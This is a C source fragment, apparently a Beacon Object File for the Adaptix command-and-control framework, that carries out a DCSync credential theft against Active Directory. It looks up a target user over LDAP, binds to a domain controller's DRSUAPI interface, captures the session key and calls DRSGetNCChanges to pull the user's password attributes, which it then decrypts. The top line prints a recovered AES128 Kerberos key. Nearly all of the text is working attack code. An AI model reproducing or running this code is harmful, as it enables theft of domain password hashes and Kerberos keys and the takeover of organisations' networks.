    if (foundAES128) OUTPUT_PRINT("  aes128:\t%s", aes128Key);
}

void go(char *args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);
    
    // Parse arguments from Adaptix script
    char* target = BeaconDataExtract(&parser, NULL);        // Username or DN
    int isDN = BeaconDataInt(&parser);                      // 0 = username, 1 = DN
    char* ouPath = ValidateInput(BeaconDataExtract(&parser, NULL));
    char* dcAddress = ValidateInput(BeaconDataExtract(&parser, NULL));
    int useLdaps = BeaconDataInt(&parser);
    
    // Variables for cleanup
    RPC_BINDING_HANDLE rpcBinding = NULL;
    DRS_HANDLE drsHandle = NULL;
    DSNAME* targetDsname = NULL;
    PARTIAL_ATTR_VECTOR_V1_EXT* pPartialAttrSet = NULL;
    PrefixTableEntry* prefixEntries = NULL;
    unsigned char* oidCopies[10];  // Array to hold OID pointers for prefix table
    DWORD oidCopyCount = 0;  // Track how many OIDs were allocated
    char* dcHostname = NULL;
    LDAP* ld = NULL;
    DC_CONTEXT* dcContext = NULL;
    USER_LDAP_INFO* userInfo = NULL;
    
    // Initialize OID array
    MSVCRT$memset(oidCopies, 0, sizeof(oidCopies));
    
    // Reset session key capture for this run
    g_SessionKeyCapturing = 0;
    g_SessionKeyCopyLen = 0;
    MSVCRT$memset(g_SessionKeyCopy, 0, sizeof(g_SessionKeyCopy));
    
    if (!target || MSVCRT$strlen(target) == 0) {
        ERROR_PRINT( "[-] No target specified");
        return;
    }
    
    // Initialize LDAP connection
    ld = InitializeLDAPConnection(dcAddress, useLdaps, &dcHostname);
    if (!ld) {
        ERROR_PRINT( "[-] Failed to initialize LDAP");
        return;
    }
    
    // Get DC context (defaultNamingContext + DC GUID) in optimized query
    dcContext = GetDCContext(ld, dcHostname);
    if (!dcContext) {
        ERROR_PRINT( "[-] Failed to get DC context");
        if (dcHostname) MSVCRT$free(dcHostname);
        CleanupLDAP(ld);
        return;
    }
    
    // Get all user info (DN, sAMAccountName, GUID) in a single LDAP query
    char* searchBase = (ouPath && MSVCRT$strlen(ouPath) > 0) ? ouPath : dcContext->defaultNamingContext;
    userInfo = GetUserInfo(ld, target, searchBase, isDN);
    
    if (!userInfo) {
        ERROR_PRINT( "[-] Could not find user: %s", target);
        FreeDCContext(dcContext);
        if (dcHostname) MSVCRT$free(dcHostname);
        CleanupLDAP(ld);
        return;
    }

    // Done with LDAP
    CleanupLDAP(ld);    // Create RPC binding to DRSUAPI
    rpcBinding = CreateDRSBinding(dcHostname);
    if (!rpcBinding) {
        ERROR_PRINT( "[-] Failed to create DRSUAPI binding");
        FreeUserInfo(userInfo);
        FreeDCContext(dcContext);
        if (dcHostname) MSVCRT$free(dcHostname);
        return;
    }
    
    // Bind to DRS interface
    drsHandle = BindToDRS(rpcBinding);
    if (!drsHandle) {
        RPCRT4$RpcBindingFree(&rpcBinding);
        FreeUserInfo(userInfo);
        FreeDCContext(dcContext);
        if (dcHostname) MSVCRT$free(dcHostname);
        return;
    }
    
    KERNEL32$Sleep(100); // Small delay for drs response and session key syncing
    
    // Copy session key from callback's static buffer (if captured)
    BYTE* sessionKey = NULL;
    DWORD sessionKeyLen = 0;
    
    if (g_SessionKeyCopyLen > 0 && g_SessionKeyCopyLen <= 256) {
        sessionKey = (BYTE*)MSVCRT$malloc(g_SessionKeyCopyLen);
        if (sessionKey) {
            MSVCRT$memcpy(sessionKey, g_SessionKeyCopy, g_SessionKeyCopyLen);
            sessionKeyLen = g_SessionKeyCopyLen;
        }
    }
    
    // Build DSNAME for the target object with GUID
    targetDsname = BuildDSName(userInfo->distinguishedName, &userInfo->objectGuid);
    
    if (!targetDsname) {
        ERROR_PRINT( "[-] Failed to build DSNAME structure for target");
        goto cleanup;
    }
    
    // Prepare GetNCChanges request (V8)
    DRS_MSG_GETCHGREQ request;
    InitDRSRequest(&request, &dcContext->dcObjectGuid, targetDsname);

    if (request.V8.PrefixTableDest.pPrefixEntry) {
        for (DWORD i = 0; i < request.V8.PrefixTableDest.PrefixCount && i < 15; i++) {
            char oidHex[128] = {0};
            for (DWORD j = 0; j < request.V8.PrefixTableDest.pPrefixEntry[i].prefix.length && j < 16; j++) {
                char byte[8];
                MSVCRT$_snprintf(byte, sizeof(byte), "%02X ", request.V8.PrefixTableDest.pPrefixEntry[i].prefix.elements[j]);
                MSVCRT$strcat(oidHex, byte);
            }

        }
    }

    // Make the DRSGetNCChanges call
    DWORD outVersion = 0;
    DRS_MSG_GETCHGREPLY reply;
    MSVCRT$memset(&reply, 0, sizeof(reply));
    
    // Using V8 request (gets V1 or V6 reply)
    ULONG result = IDL_DRSGetNCChanges(
        drsHandle,
        8,
        &request,
        &outVersion,
        &reply
    );
    
    if (result != 0) {
        ERROR_PRINT( "[-] DRSGetNCChanges failed: 0x%x (%u)", result, result);
        goto cleanup;
    }
    
    // Process the reply based on version - access correct union member
    REPLENTINFLIST* objects = NULL;

    switch (outVersion) {
        case 1:
            objects = reply.V1.pObjects;
            break;
        case 6:
        case 7:
        case 9:
            objects = reply.V6.pObjects;  // V6 structure
            break;
        default:
            ERROR_PRINT( "[!] Unexpected reply version: %u", outVersion);
            goto cleanup;
    }
    
    if (objects) {
        ENTINF* entinf = &objects->Entinf;
        ATTRBLOCK* attrBlock = &entinf->AttrBlock;
        
        for (ULONG i = 0; i < attrBlock->attrCount; i++) {
            ATTR* attr = &attrBlock->pAttr[i];
            if (attr->attrTyp == ATT_UNICODE_PWD && attr->AttrVal.valCount > 0) {
                DWORD valLen = attr->AttrVal.pAVal[0].valLen;
                if (valLen == 36 || valLen == 40) {
                    break;
                }
            }
        }
    }

    // Process and decrypt credentials
    ProcessCredentials(objects, userInfo->samAccountName, dcHostname, sessionKey, sessionKeyLen);
    
    
cleanup:
    // Cleanup
    if (drsHandle) IDL_DRSUnbind(&drsHandle);
    if (rpcBinding) RPCRT4$RpcBindingFree(&rpcBinding);
    if (pPartialAttrSet) MSVCRT$free(pPartialAttrSet);
    
    // Cleanup session key
    if (sessionKey) {
        MSVCRT$free(sessionKey);
        sessionKey = NULL;
    }

    // Free all OID copies
    for (DWORD i = 0; i < oidCopyCount; i++) {
        if (oidCopies[i]) MSVCRT$free(oidCopies[i]);
    }
    
    if (prefixEntries) MSVCRT$free(prefixEntries);
    if (targetDsname) MSVCRT$free(targetDsname);
    FreeUserInfo(userInfo);
    FreeDCContext(dcContext);
    if (dcHostname) MSVCRT$free(dcHostname);
}